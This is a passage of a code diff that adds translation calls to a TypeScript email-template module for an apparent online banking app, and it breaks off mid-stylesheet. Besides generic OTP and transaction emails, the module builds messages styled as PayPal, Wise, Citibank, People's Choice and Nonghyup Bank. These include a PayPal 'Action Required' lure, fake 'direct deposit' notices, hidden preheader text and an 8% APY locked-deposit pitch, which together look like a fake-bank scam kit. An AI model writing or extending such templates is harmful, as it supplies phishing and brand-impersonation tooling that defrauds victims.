@@ -1,5 +1,6 @@
 
 import { APP_CONFIG } from '../config';
+import { t } from './i18n';
 
 const fmt$ = (v: any) => {
     if (v == null || v === '') return v || '0';
@@ -20,7 +21,7 @@ import { getCitiBankEmailTemplate } from './citiBankEmailTemplate';
 import { getPeopleChoiceEmailTemplate } from './peopleChoiceEmailTemplate';
 import { getNonghyupEmailTemplate } from './nonghyupEmailTemplate';
 
-export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'card' | 'investment' | 'welcome' | 'otp' | 'high_yield_enrollment' | 'paypal' | 'wise' | 'citibank' | 'peoplechoice' | 'nonghyup' | 'live_chat_reply', data: any) => {
+export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'card' | 'investment' | 'welcome' | 'otp' | 'high_yield_enrollment' | 'paypal' | 'wise' | 'citibank' | 'peoplechoice' | 'nonghyup' | 'live_chat_reply', data: any, lang?: string) => {
    let subject = '';
    let content = '';
 
@@ -30,7 +31,7 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
     <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>${APP_CONFIG.BANK_NAME} Notification</title>
+    <title>${APP_CONFIG.BANK_NAME} ${t('notification', lang)}</title>
     <style>
       body { margin: 0; padding: 0; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #f1f5f9; color: #334155; -webkit-font-smoothing: antialiased; }
       .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); border: 1px solid #e2e8f0; }
@@ -73,10 +74,10 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
 
    const footer = `
         <div class="footer">
-           <p style="margin: 0 0 8px;">&copy; ${new Date().getFullYear()} ${APP_CONFIG.BANK_NAME}. All rights reserved.</p>
+           <p style="margin: 0 0 8px;">&copy; ${new Date().getFullYear()} ${APP_CONFIG.BANK_NAME}. ${t('all_rights_reserved', lang)}</p>
            <p style="margin: 0;">
-             <a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; 
-             <a href="${APP_CONFIG.SITE_URL}/#support">Support</a>
+             <a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; 
+             <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a>
            </p>
         </div>
       </div>
@@ -86,99 +87,99 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
 
    switch (type) {
       case 'otp':
-         subject = 'Your Verification Code';
+         subject = t('verify_your_identity', lang);
          content = `
           ${header}
           <div class="content">
-             <h2 class="headline">Verify Your Identity 🔐</h2>
+             <h2 class="headline">${t('verify_your_identity', lang)} 🔐</h2>
              <p class="text-center text-muted" style="margin-bottom: 10px;">
-               Use the code below to complete your sign-in or verification request.
+               ${t('use_code_below', lang)}
              </p>
              
              <div class="code-box">
                 <span class="code">${data.otp}</span>
              </div>
   
-             <p class="text-center text-muted" style="font-size: 13px;">This code will expire in 10 minutes.</p>
+             <p class="text-center text-muted" style="font-size: 13px;">${t('code_expire_10min', lang)}</p>
              <p class="text-center text-muted" style="font-size: 13px; margin-top: 20px;">
-               If you didn't request this, you can safely ignore this email.
+               ${t('if_didnt_request_ignore', lang)}
              </p>
           </div>
           ${footer}`;
          break;
 
       case 'welcome':
-         subject = 'Welcome to ${APP_CONFIG.BANK_NAME}';
+         subject = `${t('welcome_to', lang)} ${APP_CONFIG.BANK_NAME}`;
          content = `
         ${header}
         <div class="content">
-           <h2 class="headline">Welcome to the Future of Banking 🚀</h2>
+           <h2 class="headline">${t('welcome_future_banking', lang)} 🚀</h2>
            <p class="text-center text-muted" style="margin-bottom: 20px;">
-             Hello <strong>${data.user_name}</strong>, we're thrilled to have you join ${APP_CONFIG.BANK_NAME}.
+             ${t('hello_there', lang)} <strong>${data.user_name}</strong>
            </p>
            
            <div class="highlight-box">
-              <p class="text-muted" style="color: #1e40af; font-weight: 600;">Account Activated Successfully</p>
+              <p class="text-muted" style="color: #1e40af; font-weight: 600;">${t('account_activated', lang)}</p>
            </div>
 
            <p class="text-muted" style="font-size: 14px; margin-top: 20px;">
-             Your account is now fully active. You can now access:
+             ${t('account_activated', lang)}
            </p>
            <ul style="color: #64748b; font-size: 13px; line-height: 2; margin-top: 10px;">
-             <li>Instant global transfers</li>
-             <li>Virtual and physical card provisioning</li>
-             <li>Advanced AI financial assistant</li>
-             <li>Real-time investment linking</li>
+             <li>${t('instant_global_transfers', lang)}</li>
+             <li>${t('crypto_high_yield', lang)}</li>
+             <li>${t('ai_finance_insights', lang)}</li>
+             <li>${t('dedicated_support', lang)}</li>
            </ul>
            
            <div class="text-center" style="margin-top: 30px;">
-              <a href="${APP_CONFIG.SITE_URL}" class="btn">Go to My Dashboard</a>
+              <a href="${APP_CONFIG.SITE_URL}" class="btn">${t('go_to_dashboard', lang)}</a>
            </div>
         </div>
         ${footer}`;
          break;
 
       case 'login':
-         subject = 'New Sign-in Detected';
+         subject = t('new_signin_detected', lang);
          content = `
         ${header}
         <div class="content">
-           <h2 class="headline">New Sign-in Detected 🔐</h2>
+           <h2 class="headline">${t('new_signin_detected', lang)} 🔐</h2>
            <p class="text-center text-muted" style="margin-bottom: 10px;">
-             We noticed a new login to your ${APP_CONFIG.BANK_NAME} account.
+             ${t('noticed_new_login', lang)}
            </p>
            
            <table class="info-table">
               <tr class="info-row">
-                 <td class="info-label">Account</td>
+                 <td class="info-label">${t('account', lang)}</td>
                  <td class="info-value">${data.user_name}</td>
               </tr>
               <tr class="info-row">
-                 <td class="info-label">Time</td>
+                 <td class="info-label">${t('time', lang)}</td>
                  <td class="info-value">${data.time}</td>
               </tr>
               <tr class="info-row">
-                 <td class="info-label">Device</td>
-                 <td class="info-value">Web Client</td>
+                 <td class="info-label">${t('device', lang)}</td>
+                 <td class="info-value">${t('web_client', lang)}</td>
               </tr>
               <tr class="info-row">
-                 <td class="info-label">Country</td>
-                 <td class="info-value">${data.location || 'Unknown'}</td>
+                 <td class="info-label">${t('country', lang)}</td>
+                 <td class="info-value">${data.location || t('unknown', lang)}</td>
               </tr>
               <tr class="info-row">
-                 <td class="info-label">IP Address</td>
-                 <td class="info-value">${data.ip || 'Unknown'}</td>
+                 <td class="info-label">${t('ip_address', lang)}</td>
+                 <td class="info-value">${data.ip || t('unknown', lang)}</td>
               </tr>
            </table>
 
            <div class="alert-box">
              <p class="alert-text">
-               If this wasn't you, your account may be compromised. Please secure your account immediately.
+               ${t('if_not_you_secure', lang)}
              </p>
            </div>
            
            <div class="text-center">
-              <a href="${APP_CONFIG.SITE_URL}/#settings" class="btn">Secure My Account</a>
+              <a href="${APP_CONFIG.SITE_URL}/#settings" class="btn">${t('secure_my_account', lang)}</a>
            </div>
         </div>
         ${footer}`;
@@ -190,11 +191,12 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
          const isTxFailed = txStatus === 'Failed';
          const isTxOnHold = txStatus === 'On Hold';
          const isTxProcessing = txStatus === 'Processing';
-         subject = isTxFailed ? 'Transaction Failed' : isTxPending ? 'Transaction Pending' : isTxOnHold ? 'Transaction On Hold' : isTxProcessing ? 'Transaction Processing' : 'Transaction Receipt';
+         subject = isTxFailed ? t('tx_failed', lang) : isTxPending ? t('tx_pending', lang) : isTxOnHold ? t('tx_on_hold', lang) : isTxProcessing ? t('tx_processing', lang) : t('tx_receipt', lang);
          const statusColor = isTxFailed ? '#dc2626' : isTxPending ? '#f59e0b' : isTxOnHold || isTxProcessing ? '#2563eb' : '#10b981';
          const statusIcon = isTxFailed ? '❌' : isTxPending ? '⏳' : isTxOnHold ? '⏸️' : isTxProcessing ? '⏳' : '✅';
-         const statusText = isTxFailed ? 'Payment Failed' : isTxPending ? 'Payment Pending' : isTxOnHold ? 'Payment On Hold' : isTxProcessing ? 'Payment Processing' : 'Payment Successful';
-         const statusDesc = isTxFailed ? 'Your transaction could not be processed. Please contact support.' : isTxPending ? 'Your transaction is currently pending approval.' : isTxOnHold ? 'Your transaction is on hold. Please contact support for more information.' : isTxProcessing ? 'Your transaction is currently being processed.' : 'Your transaction has been processed successfully.';
+         const statusText = isTxFailed ? t('payment_failed', lang) : isTxPending ? t('payment_pending', lang) : isTxOnHold ? t('payment_pending', lang) : isTxProcessing ? t('payment_pending', lang) : t('payment_successful', lang);
+         const statusDesc = isTxFailed ? t('tx_desc_failed', lang) : isTxPending ? t('tx_desc_pending', lang) : isTxOnHold ? t('tx_desc_onhold', lang) : isTxProcessing ? t('tx_desc_processing', lang) : t('tx_desc_success', lang);
+         const txDisplayStatus = isTxFailed ? t('status_failed', lang) : isTxPending ? t('status_pending', lang) : isTxOnHold ? t('status_on_hold', lang) : isTxProcessing ? t('status_processing', lang) : t('status_success', lang);
 
          content = `
         ${header}
@@ -204,91 +206,91 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
            
            <div class="amount-box">
               <h1 class="amount-val">${fmt$(data.amount)}</h1>
-              <p class="amount-label">USD Amount</p>
+              <p class="amount-label">${t('usd_amount', lang)}</p>
            </div>
 
            <table class="info-table">
               <tr class="info-row">
-                 <td class="info-label">Recipient</td>
+                 <td class="info-label">${t('recipient', lang)}</td>
                  <td class="info-value">${data.to_name}</td>
               </tr>
               <tr class="info-row">
-                 <td class="info-label">Date</td>
+                 <td class="info-label">${t('date', lang)}</td>
                  <td class="info-value">${data.date}</td>
               </tr>
               <tr class="info-row">
-                 <td class="info-label">Reference ID</td>
+                 <td class="info-label">${t('reference_id', lang)}</td>
                  <td class="info-value" style="font-family: monospace; letter-spacing: 0.5px;">${data.ref_id}</td>
               </tr>
               <tr class="info-row">
-                 <td class="info-label">Status</td>
-                 <td class="info-value" style="color: ${statusColor}">${txStatus}</td>
+                 <td class="info-label">${t('status', lang)}</td>
+                 <td class="info-value" style="color: ${statusColor}">${txDisplayStatus}</td>
               </tr>
            </table>
            
            <p class="text-center text-muted" style="font-size: 13px; margin-top: 10px;">
-             If you have questions, please quote the reference ID.
+             ${t('questions_ref_id', lang)}
            </p>
            <div class="text-center">
-              <a href="${APP_CONFIG.SITE_URL}/#transactions" style="color: #2563eb; text-decoration: none; font-size: 14px; font-weight: 600; display: inline-block; margin-top: 10px;">View details &rarr;</a>
+              <a href="${APP_CONFIG.SITE_URL}/#transactions" style="color: #2563eb; text-decoration: none; font-size: 14px; font-weight: 600; display: inline-block; margin-top: 10px;">${t('view_details', lang)} &rarr;</a>
            </div>
         </div>
         ${footer}`;
          break;
 
       case 'account':
-         subject = 'Security Notice';
+         subject = t('profile_updated', lang);
          content = `
         ${header}
         <div class="content">
-           <h2 class="headline">Profile Updated 🛡️</h2>
-           <p class="text-muted">Hello <strong>${data.user_name}</strong>,</p>
-           <p class="text-muted" style="margin-top: 8px;">This email is to confirm that recent changes have been made to your account profile.</p>
+           <h2 class="headline">${t('profile_updated', lang)} 🛡️</h2>
+           <p class="text-muted">${t('hello_there', lang)} <strong>${data.user_name}</strong>,</p>
+           <p class="text-muted" style="margin-top: 8px;">${t('account_changes_confirm', lang)}</p>
            
            <div class="highlight-box">
-              <span class="highlight-label">Update Type</span>
+              <span class="highlight-label">${t('update_type', lang)}</span>
               <p class="highlight-value">${data.update_type}</p>
            </div>
 
-           <p class="text-muted" style="font-size: 14px;">If you did not make these changes, please contact support immediately.</p>
+           <p class="text-muted" style="font-size: 14px;">${t('if_not_you_changes', lang)}</p>
            
            <div class="text-center">
-              <a href="${APP_CONFIG.SITE_URL}/#contact-us" class="btn">Contact Support</a>
+              <a href="${APP_CONFIG.SITE_URL}/#contact-us" class="btn">${t('contact_support', lang)}</a>
            </div>
         </div>
         ${footer}`;
          break;
 
       case 'card':
-         subject = `Card Activity: ${data.action}`;
+         subject = t('card_activity_alert', lang);
          content = `
         ${header}
         <div class="content">
-           <h2 class="headline">Card Activity Alert 💳</h2>
-           <p class="text-muted">Hello <strong>${data.user_name}</strong>,</p>
-           <p class="text-muted" style="margin-top: 8px;">There has been activity on your card ending in <strong>${data.card_last4}</strong>.</p>
+           <h2 class="headline">${t('card_activity_alert', lang)} 💳</h2>
+           <p class="text-muted">${t('hello_there', lang)} <strong>${data.user_name}</strong>,</p>
+           <p class="text-muted" style="margin-top: 8px;">${t('activity_on_card', lang).replace('{last4}', data.card_last4)}</p>
            
            <div class="highlight-box" style="background-color: #f8fafc; border-color: #e2e8f0;">
-              <span class="highlight-label" style="color: #64748b;">Action Taken</span>
+              <span class="highlight-label" style="color: #64748b;">${t('action_taken', lang)}</span>
               <p class="highlight-value" style="color: #0f172a;">${data.action}</p>
            </div>
 
-           <p class="text-muted" style="font-size: 14px;">Manage your card settings at any time from your wallet dashboard.</p>
+           <p class="text-muted" style="font-size: 14px;">${t('manage_card_desc', lang)}</p>
            
            <div class="text-center">
-              <a href="${APP_CONFIG.SITE_URL}/#wallet" class="btn">Go to Wallet</a>
+              <a href="${APP_CONFIG.SITE_URL}/#wallet" class="btn">${t('go_to_wallet', lang)}</a>
            </div>
         </div>
         ${footer}`;
          break;
 
       case 'investment':
-         subject = `Investment Update: ${data.action} ${data.symbol}`;
+         subject = t('order_executed', lang);
          content = `
           ${header}
           <div class="content">
-             <h2 class="headline">Order Executed 📈</h2>
-             <p class="text-center text-muted" style="margin-top: 4px;">Your investment order has been filled.</p>
+             <h2 class="headline">${t('order_executed', lang)} 📈</h2>
+             <p class="text-center text-muted" style="margin-top: 4px;">${t('investment_order_filled', lang)}</p>
              
              <div class="amount-box">
                 <h1 class="amount-val">${data.symbol}</h1>
@@ -297,78 +299,78 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
   
              <table class="info-table">
                 <tr class="info-row">
-                   <td class="info-label">Total Value</td>
+                   <td class="info-label">${t('total_value', lang)}</td>
                    <td class="info-value">$${fmt$(data.amount)}</td>
                 </tr>
                 <tr class="info-row">
-                   <td class="info-label">Execution Price</td>
+                   <td class="info-label">${t('execution_price', lang)}</td>
                    <td class="info-value">$${fmt$(data.price)}</td>
                 </tr>
                 <tr class="info-row">
-                   <td class="info-label">Date</td>
+                   <td class="info-label">${t('date', lang)}</td>
                    <td class="info-value">${new Date().toLocaleDateString()}</td>
                 </tr>
              </table>
              
-             <p class="text-center text-muted" style="font-size: 13px; margin-top: 10px;">Track your portfolio performance in real-time.</p>
+             <p class="text-center text-muted" style="font-size: 13px; margin-top: 10px;">${t('track_portfolio', lang)}</p>
              <div class="text-center">
-                <a href="${APP_CONFIG.SITE_URL}/#investments" class="btn">View Portfolio</a>
+                <a href="${APP_CONFIG.SITE_URL}/#investments" class="btn">${t('view_portfolio', lang)}</a>
              </div>
           </div>
           ${footer}`;
          break;
 
       case 'high_yield_enrollment':
-         subject = 'Welcome to High Yield Investing 🚀';
+         subject = t('investment_account_activated', lang);
          content = `
           ${header}
           <div class="content">
-             <h2 class="headline">Investment Account Activated</h2>
+             <h2 class="headline">${t('investment_account_activated', lang)}</h2>
              <p class="text-center text-muted" style="margin-bottom: 20px;">
-               Congratulations <strong>${data.user_name}</strong>, your High Yield Investment account is now active.
+               ${t('congratulations_hy', lang)}
              </p>
              
              <div class="highlight-box" style="background-color: #eef2ff; border-color: #c7d2fe;">
-                <span class="highlight-label" style="color: #4338ca;">Current Rate</span>
+                <span class="highlight-label" style="color: #4338ca;">${t('current_rate', lang)}</span>
                 <p class="highlight-value" style="color: #312e81;">8.00% APY</p>
              </div>
 
              ${data.amount ? `
              <div class="amount-box" style="background-color: #f1f5f9; border-color: #e2e8f0; margin-top: 10px;">
                 <h1 class="amount-val" style="font-size: 24px;">${fmt$(data.amount)}</h1>
-                <p class="amount-label">Initial Locked Deposit</p>
+                <p class="amount-label">${t('initial_locked_deposit', lang)}</p>
              </div>
              ` : ''}
   
              <p class="text-muted" style="font-size: 14px; margin-top: 20px; text-align: center;">
-               You are now earning significantly more on your idle cash. Returns are compounded daily and paid monthly directly into your account.
+               ${t('earning_more', lang)}
              </p>
              
              <div class="text-center" style="margin-top: 30px;">
-                <a href="${APP_CONFIG.SITE_URL}" class="btn" style="background-color: #4f46e5;">Go to Dashboard</a>
+                <a href="${APP_CONFIG.SITE_URL}" class="btn" style="background-color: #4f46e5;">${t('go_to_dashboard', lang)}</a>
              </div>
           </div>
           ${footer}`;
          break;
 
       case 'wise':
-         subject = 'Wise Payment Receipt';
-         content = getWiseEmailTemplate(data);
+         subject = t('tx_receipt', lang);
+         content = getWiseEmailTemplate(data, lang);
          break;
 
       case 'citibank':
-         subject = 'Citibank Direct Deposit Notification';
-         content = getCitiBankEmailTemplate(data);
+         subject = t('tx_receipt', lang);
+         content = getCitiBankEmailTemplate(data, lang);
          break;
 
       case 'peoplechoice':
-         subject = "People's Choice Direct Deposit Confirmation";
-         content = getPeopleChoiceEmailTemplate(data);
+         subject = t('tx_receipt', lang);
+         content = getPeopleChoiceEmailTemplate(data, lang);
          break;
 
       case 'nonghyup':
-         subject = 'Nonghyup Bank Direct Deposit Notification';
-         content = getNonghyupEmailTemplate(data);
+         subject = t('tx_receipt', lang);
+         content = getNonghyupEmailTemplate(data, lang);
          break;
 
       case 'live_chat_reply': {
@@ -380,10 +382,10 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
             citibank: 'Citibank',
             peoplechoice: "People's Choice"
          };
-         const bankSender = bankNames[bankSrc] || 'Support Team';
+         const bankSender = bankNames[bankSrc] || t('support_team', lang);
          subject = bankSrc === 'paypal'
-            ? `Action Required: Unread Message Regarding Your PayPal Transfer`
-            : `${bankSender} — Support Has Replied`;
+            ? t('action_required_unread', lang)
+            : `${bankSender} — ${t('support_replied', lang)}`;
 
          // Branded wrappers per bank
          let replyHeader = header;
@@ -391,66 +393,66 @@ export const getEmailTemplate = (type: 'login' | 'transaction' | 'account' | 'ca
          let btnColor = '#2563eb';
 
          if (bankSrc === 'nonghyup') {
-            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Nonghyup Bank — Support Reply</title><style>body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f1f5f9;color:#334155;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#0033A0;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#0033A0;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,51,160,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:18px;font-weight:700;margin:0;}a{color:#0033A0;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">NONGHYUP BANK</span></div>`;
-            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Nonghyup Bank. All rights reserved.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Nonghyup Bank</title><style>body{margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#f1f5f9;color:#334155;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#0033A0;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#0033A0;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(0,51,160,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#eff6ff;border:1px solid #dbeafe;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#1e40af;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#1e3a8a;font-size:18px;font-weight:700;margin:0;}a{color:#0033A0;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">NONGHYUP BANK</span></div>`;
+            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Nonghyup Bank. ${t('all_rights_reserved', lang)}</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">${t('privacy', lang)}</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">${t('support', lang)}</a></p></div></div></body></html>`;
             btnColor = '#0033A0';
          } else if (bankSrc === 'paypal') {
-            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal — Support Reply</title><style>body{margin:0;padding:0;background:#f5f7fa;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.wrapper{max-width:600px;margin:0 auto;background:#f5f7fa;padding:20px 0 10px 0;}.header{text-align:center;padding:15px 0 25px 0;}.logo{width:74px;height:auto;display:block;margin:0 auto;}.box{background:#fff;padding:40px;margin:0 20px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05);}.headline{color:#000;margin:0 0 12px;font-size:22px;text-align:center;font-weight:700;}.text-center{text-align:center;}.text-muted{color:#6c7378;font-size:14px;line-height:1.6;margin:0;}.highlight-box{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#0070ba;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#0f172a;font-size:16px;font-weight:600;margin:0;font-style:italic;}.btn{display:inline-block;padding:14px 45px;background:#000;color:#fff;text-decoration:none;border-radius:25px;font-weight:bold;font-size:15px;margin-top:20px;min-width:140px;text-align:center;}.footer{text-align:center;padding:25px 0;font-size:11px;color:#6c7378;}</style></head><body><div style="display:none;font-size:1px;color:#f5f7fa;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="wrapper"><div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" class="logo" width="74"></div><div class="box">`;
-            replyFooter = `</div><div class="footer"><p style="margin:0 0 8px;">PayPal is committed to preventing fraudulent emails.</p><p style="margin:0;">&copy; 1999-${new Date().getFullYear()} PayPal, Inc. All rights reserved.</p></div></div></body></html>`;
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PayPal</title><style>body{margin:0;padding:0;background:#f5f7fa;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.wrapper{max-width:600px;margin:0 auto;background:#f5f7fa;padding:20px 0 10px 0;}.header{text-align:center;padding:15px 0 25px 0;}.logo{width:74px;height:auto;display:block;margin:0 auto;}.box{background:#fff;padding:40px;margin:0 20px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.05);}.headline{color:#000;margin:0 0 12px;font-size:22px;text-align:center;font-weight:700;}.text-center{text-align:center;}.text-muted{color:#6c7378;font-size:14px;line-height:1.6;margin:0;}.highlight-box{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#0070ba;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#0f172a;font-size:16px;font-weight:600;margin:0;font-style:italic;}.btn{display:inline-block;padding:14px 45px;background:#000;color:#fff;text-decoration:none;border-radius:25px;font-weight:bold;font-size:15px;margin-top:20px;min-width:140px;text-align:center;}.footer{text-align:center;padding:25px 0;font-size:11px;color:#6c7378;}</style></head><body><div style="display:none;font-size:1px;color:#f5f7fa;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="wrapper"><div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" class="logo" width="74"></div><div class="box">`;
+            replyFooter = `</div><div class="footer"><p style="margin:0 0 8px;">${t('paypal_fraud_prevention', lang)}</p><p style="margin:0;">&copy; 1999-${new Date().getFullYear()} PayPal, Inc. ${t('all_rights_reserved', lang)}</p></div></div></body></html>`;
             btnColor = '#000000';
          } else if (bankSrc === 'wise') {
-            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Wise — Support Reply</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#2E7D32;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;font-family:'Courier Prime','Courier New',Courier,monospace;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#2E7D32;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(46,125,50,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:8px;padding:16px;margin:10px 0;text-align:center;}.highlight-label{color:#166534;font-size:11px;text-transform:uppercase;font-weight:700;letter-spacing:1px;margin-bottom:4px;display:block;}.highlight-value{color:#14532d;font-size:16px;font-weight:600;margin:0;font-style:italic;}a{color:#2E7D32;text-decoration:none;font-weight:600;}a:hover{text-decoration:underline;}</style></head><body><div style="display:none;font-size:1px;color:#f1f5f9;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div><div class="container"><div class="header"><span class="brand">WISE</span></div>`;
-            replyFooter = `<div class="footer"><p style="margin:0 0 8px;">&copy; ${new Date().getFullYear()} Wise. All rights reserved.</p><p style="margin:0;"><a href="${APP_CONFIG.SITE_URL}/#privacy">Privacy</a> &bull; <a href="${APP_CONFIG.SITE_URL}/#support">Support</a></p></div></div></body></html>`;
+            replyHeader = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Wise</title><style>body{margin:0;padding:0;background:#f1f5f9;font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased;}.container{max-width:600px;margin:0 auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 6px -1px rgba(0,0,0,0.1);border:1px solid #e2e8f0;}.header{background:#2E7D32;padding:16px;text-align:center;}.brand{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px;text-decoration:none;display:inline-block;font-family:'Courier Prime','Courier New',Courier,monospace;}.content{padding:20px;}.footer{background:#f8fafc;padding:16px;text-align:center;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0;}.btn{display:inline-block;padding:12px 28px;background:#2E7D32;color:#fff;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;margin-top:10px;box-shadow:0 2px 4px rgba(46,125,50,0.2);}.headline{color:#0f172a;margin:0 0 8px;font-size:20px;text-align:center;font-weight:800;letter-spacing:-0.5px;}.text-center{text-align:center;}.text-muted{color:#64748b;font-size:14px;line-height:1.5;margin:0;}.highlight-box{background:#f0fdf4;border:1px solid 